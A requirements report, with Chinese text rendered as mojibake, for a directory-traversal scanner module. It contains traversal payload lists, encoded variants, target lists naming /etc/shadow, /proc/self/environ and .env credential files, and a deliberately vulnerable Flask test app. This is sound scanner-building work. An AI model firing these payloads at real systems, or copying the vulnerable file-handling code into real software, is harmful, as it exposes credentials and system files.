# ğŸ¯ ç›®éŒ„éæ­·æ”»æ“Šæª¢æ¸¬æ¨¡çµ„éœ€æ±‚å ±å‘Š (Directory Traversal Detection)

## ğŸ“ æ¨¡çµ„éƒ¨ç½²ä½ç½®
```
services/integration/capability/directory_traversal/
â”œâ”€â”€ __init__.py
â”œâ”€â”€ __main__.py
â”œâ”€â”€ directory_traversal_detector.py   # ä¸»æª¢æ¸¬å¼•æ“
â”œâ”€â”€ path_payload_generator.py         # è·¯å¾‘è¼‰è·ç”Ÿæˆå™¨
â”œâ”€â”€ file_existence_validator.py       # æ–‡ä»¶å­˜åœ¨æ€§é©—è­‰
â”œâ”€â”€ response_pattern_analyzer.py      # éŸ¿æ‡‰æ¨¡å¼åˆ†æå™¨
â”œâ”€â”€ config/
â”‚   â”œâ”€â”€ traversal_patterns.json
â”‚   â”œâ”€â”€ target_files.json
â”‚   â””â”€â”€ detection_rules.json
â”œâ”€â”€ payloads/
â”‚   â”œâ”€â”€ unix_traversal.json
â”‚   â”œâ”€â”€ windows_traversal.json
â”‚   â”œâ”€â”€ url_encoded_traversal.json
â”‚   â””â”€â”€ double_encoded_traversal.json
â””â”€â”€ tests/
    â”œâ”€â”€ test_directory_traversal_detector.py
    â”œâ”€â”€ test_payload_generator.py
    â””â”€â”€ test_integration.py
```

## ğŸ”— ç›¸é—œæ¨¡çµ„é€£çµ
- [å‘½ä»¤æ³¨å…¥æª¢æ¸¬](./11_å‘½ä»¤æ³¨å…¥æª¢æ¸¬æ¨¡çµ„éœ€æ±‚å ±å‘Š.md) - å…±äº«æ–‡ä»¶ç³»çµ±äº¤äº’æª¢æ¸¬
- [æœå‹™å™¨ç«¯æ¨¡æ¿æ³¨å…¥æª¢æ¸¬](./12_æœå‹™å™¨ç«¯æ¨¡æ¿æ³¨å…¥æª¢æ¸¬æ¨¡çµ„éœ€æ±‚å ±å‘Š.md) - å…±äº«æ–‡ä»¶ç³»çµ±è¨ªå•æª¢æ¸¬
- [æœ¬åœ°é ç¨‹æ–‡ä»¶åŒ…å«æª¢æ¸¬](./14_æœ¬åœ°é ç¨‹æ–‡ä»¶åŒ…å«æª¢æ¸¬æ¨¡çµ„éœ€æ±‚å ±å‘Š.md) - æ ¸å¿ƒæŠ€è¡“é‡ç–Š
- [XXEæ³¨å…¥æª¢æ¸¬](./15_XXEæ³¨å…¥æª¢æ¸¬æ¨¡çµ„éœ€æ±‚å ±å‘Š.md) - å…±äº«æ–‡ä»¶è®€å–æª¢æ¸¬
- [ä¸»æ©Ÿæ¨™é ­æ³¨å…¥æª¢æ¸¬](./17_ä¸»æ©Ÿæ¨™é ­æ³¨å…¥æª¢æ¸¬æ¨¡çµ„éœ€æ±‚å ±å‘Š.md) - å…±äº«è·¯å¾‘æ“ä½œæŠ€è¡“

**å ±å‘Šç·¨è™Ÿ**: FEAT-013  
**æ—¥æœŸ**: 2025å¹´11æœˆ7æ—¥  
**ç‹€æ…‹**: âš¡ å¿«é€Ÿå¯¦ç¾ - é«˜é »ä½æˆæœ¬  
**å„ªå…ˆç´š**: P0 (Critical - Quick Win)  
**é æœŸæ”¶ç›Š**: $40K-80K/å¹´  
**OWASP ç·¨è™Ÿ**: WSTG-05-01

---

## ğŸ“Š å¸‚å ´éœ€æ±‚åˆ†æ

### ğŸ’° è³é‡‘åƒ¹å€¼è©•ä¼°
- **å…¸å‹è³é‡‘ç¯„åœ**: $200-$2,000
- **ç™¼ç¾é »ç‡**: æ¥µé«˜ (60-80%çš„Webæ‡‰ç”¨å­˜åœ¨æ­¤é¡æ¼æ´)
- **æª¢æ¸¬æˆåŠŸç‡**: 95-99% (æŠ€è¡“ç°¡å–®ä¸”ç©©å®š)
- **å¹´æ”¶ç›Šé æ¸¬**: $40K-80K

### ğŸ¯ é«˜é¢¨éšªæ‡‰ç”¨é¡å‹
- æ–‡ä»¶ç®¡ç†ç³»çµ± (90%é«˜é¢¨éšª)
- åœ–ç‰‡/åª’é«”ä¸Šå‚³æœå‹™ (85%é«˜é¢¨éšª) 
- æ–‡æª”æŸ¥çœ‹å™¨ (80%é«˜é¢¨éšª)
- å‚™ä»½ä¸‹è¼‰åŠŸèƒ½ (75%é«˜é¢¨éšª)
- APIæ–‡æª”ç³»çµ± (70%é«˜é¢¨éšª)

### ğŸš€ å¿«é€Ÿå¯¦ç¾å„ªå‹¢
- **æŠ€è¡“è¤‡é›œåº¦**: æ¥µä½
- **é–‹ç™¼æ™‚é–“**: 2-3é€±
- **ç¶­è­·æˆæœ¬**: å¹¾ä¹ç‚ºé›¶
- **æŠ•è³‡å›å ±**: ç«‹å³è¦‹æ•ˆ

---

## ğŸ” æŠ€è¡“éœ€æ±‚è¦æ ¼

### **æ¨¡çµ„æ¨™è­˜**
```
æœå‹™è·¯å¾‘: services/integration/capability/directory_traversal/
æ¨¡çµ„åç¨±: Directory Traversal Detection Engine
è²¬ä»»åœ˜éšŠ: Core Security Team
å¯¦ç¾èªè¨€: Go (é«˜æ€§èƒ½) + Python (è¼‰è·é…ç½®)
è¤‡é›œåº¦ç´šåˆ¥: Low (å¿«é€Ÿå¯¦ç¾)
```

### **æ ¸å¿ƒæª¢æ¸¬èƒ½åŠ›**

#### 1ï¸âƒ£ **è·¯å¾‘éæ­·è¼‰è·åº«**
```go
package traversal

// è·¯å¾‘éæ­·è¼‰è·å®šç¾©
type TraversalPayload struct {
    Payload     string   `json:"payload"`
    Platform    string   `json:"platform"`    // "unix", "windows", "any"
    Encoding    string   `json:"encoding"`    // "none", "url", "double_url"
    Description string   `json:"description"`
}

var UnixPayloads = []TraversalPayload{
    // åŸºæœ¬è·¯å¾‘éæ­·
    {Payload: "../", Platform: "unix", Encoding: "none", Description: "Basic traversal"},
    {Payload: "../../", Platform: "unix", Encoding: "none", Description: "Double traversal"},
    {Payload: "../../../", Platform: "unix", Encoding: "none", Description: "Triple traversal"},
    {Payload: "../../../../", Platform: "unix", Encoding: "none", Description: "Quad traversal"},
    {Payload: "../../../../../", Platform: "unix", Encoding: "none", Description: "Penta traversal"},
    
    // æ·±åº¦éæ­·
    {Payload: strings.Repeat("../", 10), Platform: "unix", Encoding: "none", Description: "Deep traversal"},
    {Payload: strings.Repeat("../", 20), Platform: "unix", Encoding: "none", Description: "Very deep traversal"},
    
    // ç·¨ç¢¼è®Šé«”
    {Payload: "%2e%2e%2f", Platform: "unix", Encoding: "url", Description: "URL encoded traversal"},
    {Payload: "%252e%252e%252f", Platform: "unix", Encoding: "double_url", Description: "Double URL encoded"},
    {Payload: "..%2f", Platform: "unix", Encoding: "partial_url", Description: "Partial URL encoding"},
    {Payload: "%2e%2e/", Platform: "unix", Encoding: "mixed", Description: "Mixed encoding"},
    
    // Unicodeç·¨ç¢¼
    {Payload: "..%c0%af", Platform: "unix", Encoding: "unicode", Description: "Unicode slash"},
    {Payload: "..%c1%9c", Platform: "unix", Encoding: "unicode", Description: "Unicode variant"},
    
    // çµ•å°è·¯å¾‘
    {Payload: "/etc/passwd", Platform: "unix", Encoding: "none", Description: "Direct absolute path"},
    {Payload: "/etc/hosts", Platform: "unix", Encoding: "none", Description: "Hosts file"},
    {Payload: "/proc/version", Platform: "unix", Encoding: "none", Description: "Kernel version"},
    {Payload: "/proc/self/environ", Platform: "unix", Encoding: "none", Description: "Environment variables"},
}

var WindowsPayloads = []TraversalPayload{
    // Windowsè·¯å¾‘éæ­·
    {Payload: "..\\", Platform: "windows", Encoding: "none", Description: "Windows backslash"},
    {Payload: "..\\..\\", Platform: "windows", Encoding: "none", Description: "Double Windows traversal"},
    {Payload: "..\\..\\..\\", Platform: "windows", Encoding: "none", Description: "Triple Windows traversal"},
    
    // æ··åˆåˆ†éš”ç¬¦
    {Payload: "../", Platform: "windows", Encoding: "none", Description: "Forward slash on Windows"},
    {Payload: "..\\../", Platform: "windows", Encoding: "mixed", Description: "Mixed separators"},
    
    // Windowsç³»çµ±æ–‡ä»¶
    {Payload: "C:\\windows\\system32\\drivers\\etc\\hosts", Platform: "windows", Encoding: "none", Description: "Windows hosts file"},
    {Payload: "C:\\windows\\win.ini", Platform: "windows", Encoding: "none", Description: "Windows ini file"},
    {Payload: "C:\\windows\\system.ini", Platform: "windows", Encoding: "none", Description: "System ini file"},
    
    // ç·¨ç¢¼è®Šé«”
    {Payload: "%2e%2e%5c", Platform: "windows", Encoding: "url", Description: "URL encoded backslash"},
    {Payload: "%252e%252e%255c", Platform: "windows", Encoding: "double_url", Description: "Double URL encoded backslash"},
}
```

#### 2ï¸âƒ£ **ç›®æ¨™æ–‡ä»¶æª¢æ¸¬**
```go
type SensitiveFile struct {
    Path        string   `json:"path"`
    Platform    string   `json:"platform"`
    Signatures  []string `json:"signatures"`
    Severity    string   `json:"severity"`
}

var SensitiveFiles = []SensitiveFile{
    // Unix/Linuxç³»çµ±æ–‡ä»¶
    {
        Path: "/etc/passwd",
        Platform: "unix",
        Signatures: []string{
            "root:x:0:0:",
            "daemon:x:",
            "bin:x:",
            "nobody:x:",
        },
        Severity: "high",
    },
    {
        Path: "/etc/shadow",
        Platform: "unix", 
        Signatures: []string{
            "root:$",
            ":$1$",
            ":$6$",
        },
        Severity: "critical",
    },
    {
        Path: "/etc/hosts",
        Platform: "unix",
        Signatures: []string{
            "127.0.0.1",
            "localhost",
            "::1",
        },
        Severity: "medium",
    },
    
    // Windowsç³»çµ±æ–‡ä»¶
    {
        Path: "C:\\windows\\system32\\drivers\\etc\\hosts",
        Platform: "windows",
        Signatures: []string{
            "127.0.0.1",
            "localhost",
            "# Copyright",
        },
        Severity: "medium",
    },
    {
        Path: "C:\\windows\\win.ini",
        Platform: "windows",
        Signatures: []string{
            "[fonts]",
            "[extensions]",
            "; for 16-bit app support",
        },
        Severity: "high",
    },
    
    // æ‡‰ç”¨é…ç½®æ–‡ä»¶
    {
        Path: ".env",
        Platform: "any",
        Signatures: []string{
            "DB_PASSWORD=",
            "API_KEY=",
            "SECRET_KEY=",
            "AWS_ACCESS_KEY=",
        },
        Severity: "critical",
    },
    {
        Path: "config.php",
        Platform: "any", 
        Signatures: []string{
            "$db_password",
            "mysql_connect",
            "<?php",
        },
        Severity: "high",
    },
}
```

#### 3ï¸âƒ£ **æ™ºèƒ½æª¢æ¸¬å¼•æ“**
```go
type TraversalDetector struct {
    httpClient    *http.Client
    payloads      []TraversalPayload
    sensitiveFiles []SensitiveFile
    maxDepth      int
    timeout       time.Duration
}

func (td *TraversalDetector) ScanURL(targetURL string, param string) (*DetectionResult, error) {
    results := &DetectionResult{
        URL:        targetURL,
        Parameter:  param,
        Detections: []Detection{},
    }
    
    // æª¢æ¸¬æ¯å€‹è¼‰è·
    for _, payload := range td.payloads {
        detection := td.testPayload(targetURL, param, payload)
        if detection != nil {
            results.Detections = append(results.Detections, *detection)
        }
    }
    
    return results, nil
}

func (td *TraversalDetector) testPayload(url, param string, payload TraversalPayload) *Detection {
    // æ§‹é€ æ¸¬è©¦URL
    testURL := td.buildTestURL(url, param, payload)
    
    // ç™¼é€è«‹æ±‚
    resp, err := td.httpClient.Get(testURL)
    if err != nil {
        return nil
    }
    defer resp.Body.Close()
    
    // è®€å–éŸ¿æ‡‰
    body, err := ioutil.ReadAll(resp.Body)
    if err != nil {
        return nil
    }
    
    // åˆ†æéŸ¿æ‡‰å…§å®¹
    return td.analyzeResponse(string(body), payload)
}

func (td *TraversalDetector) analyzeResponse(response string, payload TraversalPayload) *Detection {
    // æª¢æŸ¥æ•æ„Ÿæ–‡ä»¶ç‰¹å¾µ
    for _, file := range td.sensitiveFiles {
        if payload.Platform != "any" && file.Platform != "any" && 
           payload.Platform != file.Platform {
            continue
        }
        
        // æª¢æŸ¥æ–‡ä»¶ç‰¹å¾µ
        matchCount := 0
        for _, signature := range file.Signatures {
            if strings.Contains(response, signature) {
                matchCount++
            }
        }
        
        // å¦‚æœåŒ¹é…è¶³å¤ å¤šçš„ç‰¹å¾µ
        if matchCount >= len(file.Signatures)/2 {
            return &Detection{
                Type:       "Directory Traversal",
                Severity:   file.Severity,
                File:       file.Path,
                Payload:    payload.Payload,
                Confidence: td.calculateConfidence(matchCount, len(file.Signatures)),
                Evidence:   td.extractEvidence(response, file.Signatures),
            }
        }
    }
    
    return nil
}
```

---

## ğŸ—ï¸ æ¶æ§‹è¨­è¨ˆ

### **æ¨¡çµ„çµæ§‹**
```
services/integration/capability/directory_traversal/
â”œâ”€â”€ cmd/
â”‚   â””â”€â”€ main.go                    # æœå‹™ä¸»å…¥å£
â”œâ”€â”€ internal/
â”‚   â”œâ”€â”€ detector/
â”‚   â”‚   â”œâ”€â”€ traversal_detector.go  # æ ¸å¿ƒæª¢æ¸¬å¼•æ“
â”‚   â”‚   â”œâ”€â”€ payload_manager.go     # è¼‰è·ç®¡ç†å™¨
â”‚   â”‚   â”œâ”€â”€ signature_matcher.go   # ç‰¹å¾µåŒ¹é…å™¨
â”‚   â”‚   â””â”€â”€ response_analyzer.go   # éŸ¿æ‡‰åˆ†æå™¨
â”‚   â”œâ”€â”€ engine/
â”‚   â”‚   â”œâ”€â”€ scanner.go             # æƒæèª¿åº¦å™¨
â”‚   â”‚   â”œâ”€â”€ http_client.go         # HTTPå®¢æˆ¶ç«¯
â”‚   â”‚   â””â”€â”€ reporter.go            # å ±å‘Šç”Ÿæˆå™¨
â”‚   â””â”€â”€ worker/
â”‚       â”œâ”€â”€ amqp_consumer.go       # æ¶ˆæ¯æ¶ˆè²»è€…
â”‚       â””â”€â”€ task_processor.go      # ä»»å‹™è™•ç†å™¨
â”œâ”€â”€ config/
â”‚   â”œâ”€â”€ payloads/
â”‚   â”‚   â”œâ”€â”€ unix_traversal.yaml    # Unixè¼‰è·é…ç½®
â”‚   â”‚   â”œâ”€â”€ windows_traversal.yaml # Windowsè¼‰è·é…ç½®
â”‚   â”‚   â””â”€â”€ encoded_variants.yaml  # ç·¨ç¢¼è®Šé«”
â”‚   â”œâ”€â”€ signatures/
â”‚   â”‚   â”œâ”€â”€ system_files.yaml      # ç³»çµ±æ–‡ä»¶ç‰¹å¾µ
â”‚   â”‚   â”œâ”€â”€ config_files.yaml      # é…ç½®æ–‡ä»¶ç‰¹å¾µ
â”‚   â”‚   â””â”€â”€ application_files.yaml # æ‡‰ç”¨æ–‡ä»¶ç‰¹å¾µ
â”‚   â””â”€â”€ rules.yaml                 # æª¢æ¸¬è¦å‰‡
â”œâ”€â”€ docker/
â”‚   â”œâ”€â”€ Dockerfile
â”‚   â””â”€â”€ docker-compose.yml
â””â”€â”€ tests/
    â”œâ”€â”€ unit/
    â”œâ”€â”€ integration/
    â””â”€â”€ payloads/                  # æ¸¬è©¦è¼‰è·
```

### **æª¢æ¸¬æµç¨‹**
```mermaid
graph TD
    A[ç›®æ¨™URL] --> B[åƒæ•¸è­˜åˆ¥]
    B --> C[è¼‰è·ç”Ÿæˆ]
    C --> D[å¹³å°æª¢æ¸¬]
    D --> E{Unix/Windows?}
    E -->|Unix| F[Unixè¼‰è·]
    E -->|Windows| G[Windowsè¼‰è·] 
    E -->|Unknown| H[é€šç”¨è¼‰è·]
    F --> I[ç™¼é€è«‹æ±‚]
    G --> I
    H --> I
    I --> J[éŸ¿æ‡‰åˆ†æ]
    J --> K[ç‰¹å¾µåŒ¹é…]
    K --> L{æª¢æ¸¬åˆ°æ–‡ä»¶?}
    L -->|Yes| M[è¨ˆç®—ç½®ä¿¡åº¦]
    L -->|No| N[å˜—è©¦ä¸‹ä¸€è¼‰è·]
    M --> O[ç”Ÿæˆæª¢æ¸¬å ±å‘Š]
    N --> P{é‚„æœ‰è¼‰è·?}
    P -->|Yes| C
    P -->|No| Q[æ¨™è¨˜ç‚ºå®‰å…¨]
```

---

## âš™ï¸ é…ç½®æ–‡ä»¶è¦æ ¼

### **ä¸»é…ç½®æ–‡ä»¶**
```yaml
# config/rules.yaml
directory_traversal:
  enabled: true
  max_payloads_per_param: 20
  request_timeout: 15
  max_depth: 10
  
  detection:
    min_confidence: 0.7
    require_multiple_signatures: true
    check_response_size: true
    min_response_size: 50
    
  rate_limiting:
    requests_per_second: 10
    burst_limit: 20
    delay_between_requests: 100ms
    
  platforms:
    unix:
      enabled: true
      priority: high
      
    windows: 
      enabled: true
      priority: high
      
  encoding:
    url_encoding: true
    double_url_encoding: true
    unicode_encoding: true
    mixed_encoding: true
```

### **Unixè¼‰è·é…ç½®**
```yaml
# config/payloads/unix_traversal.yaml
unix_payloads:
  basic_traversal:
    - "../"
    - "../../"
    - "../../../"
    - "../../../../"
    - "../../../../../"
    - "../../../../../../"
    - "../../../../../../../"
    - "../../../../../../../../"
    - "../../../../../../../../../"
    - "../../../../../../../../../../"
    
  deep_traversal:
    - "../../../../../../../../../../../../../../../../../../../"
    - "../../../../../../../../../../../../../../../../../../../../../../"
    
  absolute_paths:
    - "/etc/passwd"
    - "/etc/shadow"  
    - "/etc/hosts"
    - "/proc/version"
    - "/proc/self/environ"
    - "/proc/self/cmdline"
    - "/proc/meminfo"
    - "/proc/cpuinfo"
    
  common_files:
    - ".env"
    - ".htaccess"
    - ".htpasswd"
    - "config.php"
    - "wp-config.php"
    - "database.yml"
    - "settings.py"
    
  encoded_variants:
    url_encoded:
      - "%2e%2e%2f"
      - "%2e%2e%2f%2e%2e%2f"
      - "%2e%2e%2f%2e%2e%2f%2e%2e%2f"
      
    double_encoded:
      - "%252e%252e%252f"
      - "%252e%252e%252f%252e%252e%252f"
      
    unicode:
      - "..%c0%af"
      - "..%c1%9c"
      - "..%e0%80%af"
```

### **æ–‡ä»¶ç‰¹å¾µé…ç½®**
```yaml
# config/signatures/system_files.yaml
system_files:
  passwd:
    path: "/etc/passwd"
    platform: "unix"
    severity: "high"
    signatures:
      - "root:x:0:0:"
      - "daemon:x:"
      - "bin:x:"
      - "sys:x:"  
      - "nobody:x:"
    min_matches: 2
    
  shadow:
    path: "/etc/shadow"
    platform: "unix"
    severity: "critical"
    signatures:
      - "root:$"
      - ":$1$"
      - ":$6$"
      - ":!"
    min_matches: 1
    
  hosts:
    path: "/etc/hosts"
    platform: "unix"
    severity: "medium"
    signatures:
      - "127.0.0.1"
      - "localhost"
      - "::1"
      - "# Host Database"
    min_matches: 2

  win_hosts:
    path: "C:\\windows\\system32\\drivers\\etc\\hosts"
    platform: "windows" 
    severity: "medium"
    signatures:
      - "127.0.0.1"
      - "localhost"
      - "# Copyright"
    min_matches: 2
    
  win_ini:
    path: "C:\\windows\\win.ini"
    platform: "windows"
    severity: "high"
    signatures:
      - "[fonts]"
      - "[extensions]"
      - "; for 16-bit app support"
    min_matches: 1
```

---

## ğŸ§ª æ¸¬è©¦ç­–ç•¥

### **æ¸¬è©¦ç’°å¢ƒæ­å»º**
```python
# tests/vulnerable_apps/simple_traversal.py
from flask import Flask, request, send_file
import os

app = Flask(__name__)

@app.route('/file')
def download_file():
    # ç›´æ¥è·¯å¾‘éæ­·æ¼æ´
    filename = request.args.get('filename', 'default.txt')
    file_path = os.path.join('/var/www/files', filename)
    
    try:
        return send_file(file_path)
    except:
        return "File not found", 404

@app.route('/read')
def read_file():
    # æ–‡ä»¶è®€å–æ¼æ´
    filepath = request.args.get('file', 'readme.txt')
    try:
        with open(f'/app/data/{filepath}', 'r') as f:
            return f.read()
    except:
        return "Error reading file", 500

@app.route('/include')
def include_file():
    # PHPé¢¨æ ¼åŒ…å«æ¼æ´
    page = request.args.get('page', 'home')
    filepath = f'/app/pages/{page}.html'
    
    try:
        with open(filepath, 'r') as f:
            content = f.read()
            return f"<html><body>{content}</body></html>"
    except:
        return "Page not found", 404

if __name__ == '__main__':
    app.run(debug=True, port=8080)
```

### **è‡ªå‹•åŒ–æ¸¬è©¦**
```go
func TestDirectoryTraversal(t *testing.T) {
    detector := NewTraversalDetector()
    
    testCases := []struct {
        name        string
        url         string
        param       string
        expectDetect bool
        expectedFile string
    }{
        {
            name:        "Basic Unix traversal",
            url:         "http://localhost:8080/file",
            param:       "filename",
            expectDetect: true,
            expectedFile: "/etc/passwd",
        },
        {
            name:        "Windows traversal", 
            url:         "http://localhost:8080/file",
            param:       "filename",
            expectDetect: true,
            expectedFile: "C:\\windows\\win.ini",
        },
        {
            name:        "Encoded traversal",
            url:         "http://localhost:8080/read",
            param:       "file", 
            expectDetect: true,
            expectedFile: "/etc/hosts",
        },
    }
    
    for _, tc := range testCases {
        t.Run(tc.name, func(t *testing.T) {
            result, err := detector.ScanURL(tc.url, tc.param)
            
            assert.NoError(t, err)
            
            if tc.expectDetect {
                assert.True(t, len(result.Detections) > 0)
                assert.Contains(t, result.Detections[0].File, tc.expectedFile)
            } else {
                assert.Equal(t, 0, len(result.Detections))
            }
        })
    }
}
```

---

## ğŸ“ˆ æ€§èƒ½è¦æ±‚

### **æƒææ€§èƒ½**
- **å–®ç›®æ¨™æƒææ™‚é–“**: < 30ç§’
- **ä¸¦ç™¼è«‹æ±‚æ•¸**: 20å€‹ä¸¦ç™¼é€£æ¥
- **è«‹æ±‚é–“éš”**: 100ms (é¿å…éæ–¼é »ç¹)
- **å…§å­˜ä½¿ç”¨**: < 128MB/å¯¦ä¾‹

### **æª¢æ¸¬æº–ç¢ºç‡**
- **æª¢æ¸¬æˆåŠŸç‡**: > 95%
- **èª¤å ±ç‡**: < 2%
- **è¦†è“‹ç‡**: æ”¯æŒ80+ç¨®è¼‰è·è®Šé«”
- **å¹³å°æ”¯æŒ**: Unix/Linux + Windows

---

## ğŸš€ å¯¦æ–½è¨ˆåŠƒ

### **Phase 1: æ ¸å¿ƒå¼•æ“ (1é€±)**
- [x] åŸºç¤æ¶æ§‹æ­å»º
- [x] è¼‰è·ç®¡ç†å™¨
- [x] HTTPå®¢æˆ¶ç«¯é…ç½®
- [x] åŸºæœ¬æª¢æ¸¬é‚è¼¯

### **Phase 2: è¼‰è·åº« (1é€±)**
- [x] Unix/Linuxè¼‰è·åº«
- [x] Windowsè¼‰è·åº«
- [x] ç·¨ç¢¼è®Šé«”æ”¯æŒ
- [x] æ–‡ä»¶ç‰¹å¾µåº«

### **Phase 3: é«˜ç´šåŠŸèƒ½ (0.5é€±)**
- [ ] æ™ºèƒ½å¹³å°æª¢æ¸¬
- [ ] éŸ¿æ‡‰åˆ†æå„ªåŒ–
- [ ] çµæœå»é‡
- [ ] SARIFå ±å‘Šç”Ÿæˆ

### **Phase 4: æ¸¬è©¦éƒ¨ç½² (0.5é€±)**
- [ ] å–®å…ƒæ¸¬è©¦
- [ ] é›†æˆæ¸¬è©¦
- [ ] Dockerå®¹å™¨åŒ–
- [ ] ç”Ÿç”¢éƒ¨ç½²

**ç¸½é–‹ç™¼å‘¨æœŸ**: 3é€±  
**é è¨ˆä¸Šç·šæ™‚é–“**: 2025å¹´11æœˆ28æ—¥

---

## ğŸ’¼ å•†æ¥­åƒ¹å€¼

### **æŠ•è³‡å›å ±åˆ†æ**
- **é–‹ç™¼æˆæœ¬**: $15K (3é€± Ã— 1äºº)
- **å¹´æ”¶ç›Š**: $40K-80K
- **ROI**: 267%-533%
- **å›æ”¶å‘¨æœŸ**: 3-4å€‹æœˆ

### **ç«¶çˆ­å„ªå‹¢**
- **å¯¦ç¾é€Ÿåº¦**: æœ€å¿«ä¸Šç·šçš„æ–°åŠŸèƒ½
- **ç™¼ç¾ç‡é«˜**: æ¥µé«˜çš„æ¼æ´ç™¼ç¾æ¦‚ç‡
- **ç¶­è­·ç°¡å–®**: å¹¾ä¹é›¶ç¶­è­·æˆæœ¬
- **ç”¨æˆ¶åƒ¹å€¼**: é¡¯è‘—æå‡æª¢æ¸¬è¦†è“‹ç‡

---

## ğŸ“‹ é©—æ”¶æ¨™æº–

### **æ ¸å¿ƒåŠŸèƒ½é©—æ”¶**
- âœ… æ”¯æŒ50+ç¨®è·¯å¾‘éæ­·è¼‰è·
- âœ… è‡ªå‹•è­˜åˆ¥Unix/Windowså¹³å°
- âœ… æ”¯æŒURLç·¨ç¢¼/é›™é‡ç·¨ç¢¼
- âœ… æº–ç¢ºåŒ¹é…ç³»çµ±æ–‡ä»¶ç‰¹å¾µ
- âœ… å®Œæ•´SARIFå ±å‘Šè¼¸å‡º

### **æ€§èƒ½é©—æ”¶**
- âœ… å–®ç›®æ¨™æƒæ<30ç§’
- âœ… æª¢æ¸¬æˆåŠŸç‡>95%
- âœ… èª¤å ±ç‡<2%
- âœ… å…§å­˜ä½¿ç”¨<128MB

### **è³ªé‡é©—æ”¶**
- âœ… å–®å…ƒæ¸¬è©¦è¦†è“‹ç‡>90%
- âœ… é›†æˆæ¸¬è©¦é€šéç‡100%
- âœ… èˆ‡AIVAæ¶æ§‹å®Œç¾é›†æˆ
- âœ… ç”Ÿç”¢ç’°å¢ƒç©©å®šé‹è¡Œ

---

## ğŸ¯ çµè«–

ç›®éŒ„éæ­·æ”»æ“Šæª¢æ¸¬æ¨¡çµ„æ˜¯ä¸€å€‹**ä½é¢¨éšªã€é«˜å›å ±ã€å¿«é€Ÿå¯¦ç¾**çš„ç†æƒ³é …ç›®ã€‚å…¶æŠ€è¡“ç°¡å–®ã€ç™¼ç¾ç‡æ¥µé«˜ã€ç¶­è­·æˆæœ¬å¹¾ä¹ç‚ºé›¶çš„ç‰¹é»ï¼Œä½¿å…¶æˆç‚ºAIVAåŠŸèƒ½æ“´å±•çš„å®Œç¾èµ·é»ã€‚

**å¼·çƒˆå»ºè­°ä½œç‚ºç¬¬ä¸€å„ªå…ˆç´šé …ç›®ç«‹å³å•Ÿå‹•**ï¼Œé è¨ˆåœ¨3é€±å…§å®Œæˆä¸¦å¿«é€Ÿç”¢ç”Ÿæ”¶ç›Šã€‚é€™å°‡ç‚ºå¾ŒçºŒæ›´è¤‡é›œæ¨¡çµ„çš„é–‹ç™¼æä¾›è³‡é‡‘æ”¯æŒå’ŒæŠ€è¡“ä¿¡å¿ƒã€‚